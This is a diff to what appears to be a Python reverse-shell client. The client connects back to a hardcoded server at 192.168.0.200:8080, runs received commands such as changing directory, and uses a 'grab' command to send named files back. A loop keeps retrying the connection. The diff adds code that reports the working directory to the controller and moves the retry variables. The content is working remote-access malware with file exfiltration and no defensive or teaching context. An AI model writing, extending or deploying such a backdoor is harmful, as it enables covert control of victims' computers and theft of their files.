@@ -14,6 +14,9 @@ SERV_ADDRESS = ("192.168.0.200", 8080)
 state = True
 SIZE = 1024
 
+total = 0
+delay = 10
+
 def create_socket():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(SERV_ADDRESS)
@@ -48,6 +51,7 @@ def try2connect(socket):
         elif "cd " in command.decode():
             directory = command.decode()[3:]
             os.chdir(directory)
+            socket.send(os.getcwd().encode())
         elif "grab" in command.decode():
             grab, path = command.decode().split("*")
             transfer(socket, path)
@@ -73,9 +77,6 @@ def make_connection():
         times = total/delay
         print('Retry in {} seconds already tried {} times'.format(delay, int(times))) if state else print("Exit program")
         time.sleep(delay)
-
-total = 0
-delay = 10
 
 while(state):
     make_connection()
